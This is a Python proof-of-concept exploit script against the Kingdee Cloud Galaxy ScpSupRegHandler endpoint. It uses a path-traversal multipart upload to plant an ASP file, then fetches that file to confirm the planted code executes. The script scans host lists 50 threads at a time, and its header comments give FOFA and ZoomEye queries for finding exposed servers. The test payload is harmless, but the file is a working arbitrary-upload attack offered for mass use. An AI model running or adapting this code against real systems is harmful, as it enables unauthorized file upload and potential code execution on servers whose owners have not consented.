#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：icon_hash="-1629133697"
# zoomeye:app:"金蝶云星空


import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Kingdee_ScpSupRegHandler_Upload_File_Poc.py url.txt                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;boundary=fd18dd968b553715cbc5a1982526199b",
        "Host": "%s" %host2
    }
    data ="""--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/6666666.asp."
Content-Type: text/plain

<% Response.Write("6666666") %>
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="FID"

2022
--fd18dd968b553715cbc5a1982526199b
Content-Disposition: form-data; name="dbId_v"

.
--fd18dd968b553715cbc5a1982526199b--
"""
    vulurl = url + "/k3cloud/SRM/ScpSupRegHandler"
    vulurl1 = url + "/K3Cloud/uploadfiles/6666666.asp"
    
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        if  "true" in r.text:
            print(url+"存在上传接口")
            #print("文件地址为:"+url+"/K3Cloud/uploadfiles/666666.asp")
            r2=requests.get(vulurl1,headers=headers,verify=False)
            if r2.status_code==200 and "6666666" in r2.text:
                print("文件地址为:"+url+"/K3Cloud/uploadfiles/6666666.asp")
            #print("http://"+host+":true 文件地址为："+"")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])